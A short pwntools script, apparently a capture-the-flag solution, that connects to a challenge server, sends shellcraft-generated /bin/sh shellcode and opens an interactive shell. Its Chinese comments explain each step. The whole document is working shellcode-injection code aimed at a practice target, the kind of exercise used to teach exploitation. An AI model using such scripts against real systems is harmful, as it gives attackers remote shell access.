from pwn import *
p=remote("pwn.challenge.ctf.show",28284)#与服务器的pwn文件建立联系
shell=asm(shellcraft.sh())#利用shellcraft模块生成调用系统shell（/bin/sh）的shellcode。这个shellcode可以用于执行命令行命令
p.sendline(shell)#向远程发送shellcode
p.interactive()#建立交互式对话